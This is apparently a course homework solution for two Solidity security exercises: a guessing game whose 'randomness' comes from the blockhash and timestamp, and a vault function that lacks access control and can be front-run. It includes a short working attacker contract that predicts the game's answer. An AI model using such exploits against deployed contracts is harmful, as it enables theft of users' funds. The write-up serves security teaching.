# HW4 Solution
## Task 1: Game

### Description
`Game.sol` is a game where you win ether by guessing the correct number. 
When playing, you input a random number and specify the address to receive the prize.

Write your solution in `GameAttack.sol, Game.t.sol`, without modifying other code.  
Try to pass the tests in `GameBaseTest.t.sol`.

### Solution 
Since this contract uses the blockhash of the previous block and block.timestamp as parameters for randomness, it is vulnerable to predictable randomness attacks. These values are publicly accessible and can be manipulated to some extent, making it possible for an attacker to predict the answer. This predictability undermines the fairness of the game and allows attackers to gain an unfair advantage.

An attacker can easily predict the answer and always win the game by calling the attack function.
``` solidity
pragma solidity >=0.8.0 <0.9.0;
contract Attacker {
    Game game;

    receive() external payable {}

    constructor(Game _guessTheRandomNumber) payable {
        game = _guessTheRandomNumber;
    }

    function attack() public {
        // attacker just put the answer into input to win the game
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        game.guess(answer, address(this));
    }
}
```

## Task 2: SimpleVault

### Description
`SimpleVault.sol` is a contract that manages withdrawal reserves, processes withdrawals through a proxy contract, and uses epochs for fund management.

Write your solution in `SimpleVault.t.sol`, without modifying other code.  
Try to pass the tests in `SimpleVaultBaseTest.t.sol`.

### Solution 
transferWithdrawReserve() lack of access control.
Any user can monitor when the owner is about to set the withdrawProxy for a specific epoch and front-run by calling transferWithdrawReserve() beforehand, causing the withdrawReserve to be reduced or set to zero.

### Additional
Task 2 modified from [here](https://github.com/sherlock-audit/2022-10-astaria-judging/issues/163), retaining the root cause.